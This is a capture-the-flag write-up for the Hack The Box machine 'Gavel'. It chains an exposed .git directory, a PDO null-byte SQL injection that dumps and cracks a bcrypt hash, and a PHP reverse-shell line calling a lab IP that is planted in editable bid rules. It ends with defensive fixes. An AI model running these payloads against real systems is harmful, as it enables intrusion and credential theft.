---
title: "Gavel HTB — From PDO SQL Injection to RCE"
date: 2025-06-19
categories: [HTB, Web, Security]
tags: [sqli, pdo, php, rce, hashcat, git-dumper, mysql, web, htb]
image:
  path: /assets/gavel/cover.png
---

# 💉 Gavel HTB — PDO SQL Injection to RCE

## 1️⃣ Initial Enumeration

Starting with an Nmap scan against the target:

```shell
nmap -sV 10.129.242.203
```

Results showed only two open ports:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

⚠️ Only SSH and HTTP — this is clearly a **web-based machine**.

Browsing to the web app revealed a standard landing page with **Login** and **Signup** options.

![Desktop View](/assets/gavel/1.png){: width="700" height="400" .normal }

![Desktop View](/assets/gavel/3.png){: width="700" height="400" .normal }

![Desktop View](/assets/gavel/4.png){: width="700" height="400" .normal }


After registering and logging in, the interface changed — confirming user session handling is in place.

![Desktop View](/assets/gavel/5.png){: width="700" height="400" .normal }


Directory fuzzing returned many paths, but none were directly useful at this stage.

---

## 2️⃣ Dumping the Git Repository

Noticing exposed Git metadata on the web server, I used **git-dumper** to pull the full source code:

```shell
git-dumper http://gavel.htb dump
```

![Desktop View](/assets/gavel/6.png){: width="700" height="400" .normal }


With the source in hand, I ran **Snyk** to perform a static vulnerability scan:

![Desktop View](/assets/gavel/7.png){: width="700" height="400" .normal }


The scan flagged several potential SQL injection points in the PHP code using PDO prepared statements.

![Desktop View](/assets/gavel/8.png){: width="700" height="400" .normal }

---

## 3️⃣ Exploiting PDO Prepared Statements — Novel SQL Injection

After research, I found a **novel SQL injection technique** targeting PDO's prepared statement parser. The key insight is how PDO handles backtick identifiers with null bytes.

> **Reference:** [Novel SQL Injection Technique in PDO Prepared Statements](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)

### How the Vulnerability Works

Consider this query:

```sql
SELECT `\?-- -\0` FROM inventory WHERE user_id = ?
```

**PDO's internal parsing logic:**

```shell
PDO: sees ` → start of backtick identifier, keep reading...
PDO: sees \ → normal character, keep reading...
PDO: sees ? → still inside backtick, keep reading...
PDO: sees -- → still inside backtick, keep reading...
PDO: sees \0 (NULL BYTE) → PANIC!
PDO: Backtrack — pretend backtick never opened!
PDO: Re-reads: sees \ → skip
PDO: sees ? → THIS IS A PLACEHOLDER! Mark it!
PDO: sees -- → this is a comment, stop reading!
PDO: RESULT: found 1 placeholder before the comment
```

PDO then replaces the placeholder with our user-supplied value after escaping single quotes (`'` → `\'`).

This means we can **inject SQL after a backtick-terminated subquery alias**, bypassing prepared statement protections.

---

## 4️⃣ Confirming the Injection

Switching the request method to **POST** and testing with:

```shell
sort=\?--+-%00&user_id=x` FROM (SELECT version() AS `'x`)s;
```
![Desktop View](/assets/gavel/9.png){: width="700" height="400" .normal }


✅ The MySQL version was returned — **SQL injection confirmed**.

---

## 5️⃣ Enumerating the Database

### Listing Columns in the `users` Table

```shell
sort=\?--+-%00&user_id=x` FROM (SELECT group_concat(column_name) AS `'x` FROM information_schema.columns WHERE table_name=0x7573657273)s;
```
![Desktop View](/assets/gavel/10.png){: width="700" height="400" .normal }


### Extracting Credentials

Dumping the first user's credentials:

```shell
sort=\?--+-%00&user_id=x` FROM (SELECT concat(username,0x3a,password) AS `'x` FROM users LIMIT 1)s;
```

![Desktop View](/assets/gavel/11.png){: width="700" height="400" .normal }

Dumping all users:

```shell
sort=\?--+-%00&user_id=x` FROM (SELECT group_concat(username,0x3a,password) AS `'x` FROM users)s;
```

![Desktop View](/assets/gavel/12.png){: width="700" height="400" .normal }

Extracted hash:

```shell
auctioneer:$2y$10$MNkDHV6g16FjW/1AQRpLiuQXN4MVkdMuILn0pLQ1C2So9SgH5RTfS
```

---

## 6️⃣ Cracking the Hash

The hash is **bcrypt** (`$2y$`), so we use Hashcat mode `3200`:

```shell
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![Desktop View](/assets/gavel/13.png){: width="700" height="400" .normal }

```shell
auctioneer:midnight1
```

SSH login with these credentials **failed**.
However, logging into the **web application** as `auctioneer` succeeded and revealed an **Admin Panel**.

![Desktop View](/assets/gavel/14.png){: width="700" height="400" .normal }

![Desktop View](/assets/gavel/15.png){: width="700" height="400" .normal }


---

## 7️⃣ Code Execution via Bid Rule Injection

Reviewing the dumped repository, I found a `rules.yaml` file defining bidding validation logic:

![Desktop View](/assets/gavel/16.png){: width="700" height="400" .normal }


```yaml
rules:
  - rule: "return $current_bid >= $previous_bid * 1.1;"
    message: "Bid at least 10% more than the current price."

  - rule: "return $current_bid % 5 == 0;"
    message: "Bids must be in multiples of 5."

  - rule: "return $current_bid >= $previous_bid + 5000;"
    message: "Only bids greater than 5000 + current bid will be considered."
```



These rules are **evaluated server-side as PHP code**. As an admin, I could edit them.

### Exploitation Steps

**1. Set up a listener:**

```shell
nc -lvnp 9001
```

**2. Edit a bid rule with a PHP reverse shell payload:**

```php
system('bash -c "bash -i >& /dev/tcp/10.10.16.216/9001 0>&1"'); return true;
```



**3. Trigger the rule by placing a bid** on any active auction item.


**BINGO** — shell received!

![Desktop View](/assets/gavel/17.png){: width="700" height="400" .normal }

---

## 🎯 Impact

This attack chain demonstrates a full compromise via:

- **Source code exposure** through an exposed `.git` directory
- **Novel PDO SQL Injection** bypassing prepared statement protections
- **Credential extraction** and hash cracking
- **Server-Side Code Execution** via unsafe `eval`-style rule evaluation

This is a **Critical Severity** exploit chain.

---

## 🛡️ Root Cause

### 1. Exposed `.git` Directory
The web server served `.git/` metadata publicly, allowing full source code recovery.

### 2. PDO SQL Injection
The application used PDO prepared statements incorrectly — user input was embedded in a way that allowed the null-byte backtick trick to bypass placeholder counting, enabling raw SQL injection.

### 3. Unsafe Rule Evaluation
The bid rule system executed admin-supplied strings as PHP code using `eval()` or equivalent, with no sandboxing or sanitization.

---

## ✅ Recommendations

**1️⃣ Disable `.git` Directory Access**

Block access via web server config:
```nginx
location ~ /\.git {
    deny all;
}
```

**2️⃣ Fix PDO Query Construction**

Avoid placing user-controlled data in any part of the query structure — including column names and sort parameters. Use an allowlist for sortable fields.

**3️⃣ Never Evaluate User-Supplied Code**

Replace the dynamic rule evaluation system with a safe expression evaluator or a fixed set of configurable parameters. Never call `eval()` on any user or admin-supplied input.

**4️⃣ Enforce Least Privilege**

The web application's database user should not have access to `information_schema`. Restrict permissions to only the tables the app needs.

**5️⃣ Monitoring & Detection**

- Log and alert on unusual `sort` parameter values.
- Monitor for null bytes (`\0`) in request parameters.
- Alert on outbound connections from the web server process.

---

## HAPPY HACKING 😈
